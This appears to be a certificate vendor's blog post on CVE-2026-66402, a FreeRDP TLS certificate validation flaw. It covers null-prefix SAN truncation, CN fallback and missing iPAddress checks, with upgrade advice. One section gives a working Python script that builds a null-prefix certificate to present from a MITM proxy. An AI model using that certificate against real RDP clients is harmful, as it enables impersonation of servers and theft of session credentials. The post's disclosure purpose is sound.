---
title: "FreeRDP's TLS Certificate Validation Bug Is the Null-Prefix Attack, Again"
description: "CVE-2026-66402 shows FreeRDP accepting mismatched server certificates due to strlen()-based SAN parsing, a CN fallback, and missing iPAddress SAN checks. Fixed in 3.29.0, and it's the same bug class from 2009."
pubDate: 2026-08-05
author: "KrakenKey Team"
tags: ["cve", "tls", "certificate-validation", "freerdp", "cwe-295", "pki"]
draft: false
---

FreeRDP versions through 3.28.0 will accept a TLS server certificate that does not match the hostname or IP address being connected to, under three distinct conditions. CVE-2026-66402 (CVSS 3.1: 9.8, CVSS 4.0: 9.3) covers all three. The fix landed in FreeRDP 3.29.0, released August 1, 2026.

## What changed

The [GitHub Security Advisory GHSA-43hh-p3vw-hfx3](https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-43hh-p3vw-hfx3) (CVE-2026-66402, CWE-295: Improper Certificate Validation) identifies three flaws in `libfreerdp/crypto/tls.c` and `libfreerdp/crypto/x509_utils.c`:

1. **`x509_utils_get_dns_names()`** extracts DNS SAN entries using `strlen()` on the decoded buffer instead of the ASN.1-declared length. A SAN containing an embedded NUL byte, such as `victim.example\0.attacker.example`, gets truncated at the NUL during comparison, so it matches `victim.example`.
2. **`tls_verify_certificate()`** checks the Common Name before it finishes validating DNS SAN entries. If DNS SANs are present but none match, a matching CN still passes verification. RFC 6125 deprecated CN fallback specifically because SAN is supposed to be authoritative once present.
3. When the client connects to a bare IP address, **`tls_match_hostname()`** compares the target against DNS SAN and CN values instead of extracting `iPAddress` SAN entries and comparing those directly. A certificate carrying `10.0.0.5` only in its DNS SAN string (not the `iPAddress` extension) is accepted anyway.

The root cause across all three is the same architectural choice: FreeRDP rolled its own string-matching logic instead of calling OpenSSL's `X509_check_host()` and `X509_check_ip()`, which are ASN.1-length-aware and implement RFC 6125 correctly. Two sibling CVEs from the same disclosure, CVE-2026-67293 (hostname validation) and CVE-2026-67294 (EKU purpose not checked on the server cert), point at the same file.

## Why it matters operationally

This is a client-side bug, not a CA or server misconfiguration, and it's exploitable by anyone who can present a certificate to the connection: a MITM position, or simply a misissued or adjacent certificate from a CA the client trusts. It matters most in exactly the deployments where FreeRDP shows up as infrastructure rather than a desktop app.

- **Apache Guacamole** uses FreeRDP as its RDP backend. Guacamole gateways terminate browser-based remote access to internal Windows hosts, frequently over private-CA-issued TLS, and are commonly placed at the edge of segmented networks specifically so admins don't need a VPN client. A validation bypass here defeats the one control (server identity) standing between an attacker on the path and a credential-carrying RDP session.
- **Remmina** and other Linux RDP clients link against `libfreerdp`, so the flaw isn't limited to `xfreerdp` invoked directly.
- Any environment using a private or internal CA for RDP endpoint certificates is more exposed than public-CA users, since private CAs more often issue certs with looser SAN hygiene and are more likely to be reachable by an internal attacker who can get a certificate signed.

If you run any of the above, the fix is to upgrade to FreeRDP 3.29.0 or later. There's no configuration workaround, because the bug is in the matching logic itself, not a flag you can toggle.

## Reproducing the embedded-NUL case

This is the classic "null prefix" certificate attack, first publicized by Moxie Marlinspike in 2009 against several TLS stacks, resurfacing because the underlying mistake (using a C string function on a length-prefixed ASN.1 value) is easy to reintroduce. Building a NUL byte into a SAN string requires constructing the extension programmatically; `openssl.cnf` text parsing won't pass a raw `\x00` through. The `cryptography` library will:

```python
# build_nul_san_cert.py: self-signed cert with an embedded-NUL DNS SAN
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
import datetime

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "victim.example")])

# GeneralName expects a str. Embed a NUL byte in the DNSName value so
# strlen()-based matching truncates it at "victim.example".
malicious_san = b"victim.example\x00.attacker.example"

builder = (
    x509.CertificateBuilder()
    .subject_name(name)
    .issuer_name(name)
    .public_key(key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(datetime.datetime.utcnow())
    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=30))
)
san_ext = x509.SubjectAlternativeName([x509.DNSName(malicious_san.decode("latin-1"))])
cert = builder.add_extension(san_ext, critical=False).sign(key, hashes.SHA256())

with open("cert.pem", "wb") as f:
    f.write(cert.public_bytes(serialization.Encoding.PEM))
with open("key.pem", "wb") as f:
    f.write(key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    ))
```

Present that certificate from a server (or a MITM proxy) that a pre-3.29.0 FreeRDP client connects to as `victim.example`. Correct validation via `X509_check_host()` rejects it, because the ASN.1 length says the SAN is 33 bytes, not 14. FreeRDP's `strlen()`-based comparison stops at the NUL and reports a match against `victim.example`. Against 3.29.0 or later, the same certificate is rejected.

## Where KrakenKey fits

This doesn't touch KrakenKey's issuance flow. We don't control how a downstream TLS client parses the certificates we issue, and correct issuance can't compensate for a client that mis-implements RFC 6125 matching. If you're running Guacamole, Remmina, or any other FreeRDP-based gateway against certificates issued through KrakenKey (or anyone else), the certificates themselves are fine; the fix is upgrading the client library, not re-issuing anything.
